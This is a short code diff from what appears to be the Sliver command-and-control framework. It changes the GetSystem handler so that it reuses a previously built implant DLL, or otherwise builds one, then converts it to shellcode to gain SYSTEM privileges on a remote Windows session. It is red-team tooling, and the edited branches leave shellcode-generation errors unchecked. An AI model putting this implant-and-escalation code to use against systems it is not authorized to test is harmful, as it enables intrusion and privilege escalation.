@@ -61,21 +61,23 @@ func (rpc *Server) RevToSelf(ctx context.Context, req *sliverpb.RevToSelfReq) (*
 
 // GetSystem - Attempt to get 'NT AUTHORITY/SYSTEM' access on a remote Windows system
 func (rpc *Server) GetSystem(ctx context.Context, req *clientpb.GetSystemReq) (*sliverpb.GetSystem, error) {
+	var shellcode []byte
 	session := core.Sessions.Get(req.Request.SessionID)
 	if session == nil {
 		return nil, ErrInvalidSessionID
 	}
 
-	config := generate.ImplantConfigFromProtobuf(req.Config)
-	config.Format = clientpb.ImplantConfig_SHARED_LIB
-	config.ObfuscateSymbols = false
-	dllPath, err := generate.SliverSharedLibrary(config)
-	if err != nil {
-		return nil, err
-	}
-	shellcode, err := generate.ShellcodeRDI(dllPath, "", "")
-	if err != nil {
-		return nil, err
+	if sliverData, err := getPreviousSliverDll(req.Config.GetName()); err == nil {
+		shellcode, err = generate.ShellcodeRDIFromBytes(sliverData, "", "")
+	} else {
+		config := generate.ImplantConfigFromProtobuf(req.Config)
+		config.Format = clientpb.ImplantConfig_SHARED_LIB
+		config.ObfuscateSymbols = false
+		dllPath, err := generate.SliverSharedLibrary(config)
+		if err != nil {
+			return nil, err
+		}
+		shellcode, err = generate.ShellcodeRDI(dllPath, "", "")
 	}
 	data, err := proto.Marshal(&sliverpb.InvokeGetSystemReq{
 		Data:           shellcode,
